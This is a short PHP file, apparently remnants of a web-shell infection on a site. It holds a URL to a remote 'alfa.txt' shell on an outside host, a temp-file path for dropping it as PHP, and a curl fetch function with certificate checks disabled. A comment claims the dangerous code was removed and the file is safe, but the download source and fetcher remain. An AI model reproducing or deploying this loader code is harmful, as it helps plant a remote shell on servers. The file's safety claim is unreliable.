<?php
$data = ['https://shell.prinsh.com/Nathan/alfa.txt', '/tmp/sesss_'.md5($_SERVER['HTTP_HOST']).'.php'];
 

/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code has been removed, and the file is now safe to use.
*/

 
function get($url) {
    $ch = curl_init();
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
          curl_setopt($ch, CURLOPT_URL, $url);
          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    return curl_exec($ch);
          curl_close($ch);
}
?>